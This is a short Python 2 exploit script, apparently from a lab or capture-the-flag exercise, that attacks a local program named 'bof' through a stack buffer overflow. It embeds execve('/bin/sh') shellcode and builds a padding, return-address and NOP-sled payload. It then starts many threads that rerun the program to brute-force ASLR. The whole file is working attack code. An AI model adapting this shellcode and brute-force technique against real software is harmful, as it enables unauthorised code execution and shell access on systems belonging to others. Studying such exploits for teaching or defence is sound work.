#!/usr/bin/python
"""
Exploit code for bof
"""


import struct
from subprocess import PIPE, Popen
import Queue, threading, sys

# exec /bin/sh
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

bufsize = 100
offset = 12     #incl. saved ebp
nopsize = 4096

threads = 50

exploit_success = False

def prep_buffer(addr_buffer):
    buf = "A" * (bufsize+offset)
    buf += struct.pack("<I",(addr_buffer+bufsize+offset+4))
    buf += "\x90" * nopsize
    buf += shellcode
    return buf

def brute_aslr(buf, thread_num):
    global exploit_success
    i = 0
    while exploit_success != True:
        print "[%s, %d]" % (format(thread_num,'#04x'), i)
        p = Popen(['./bof', buf], stdout=PIPE)
        while p.poll() is None:
            exploit_success = True
            line = p.stdout.readline()
            if line:
                sys.stdout.write(line)

if __name__ == '__main__':
    addr_buffer = 0xbf92b39c
    for addr in range(0xf):
        addr += 0xbffff4f0
        buf = prep_buffer(addr)
        t = threading.Thread(target=brute_aslr,args=(buf,addr,))
        t.start()

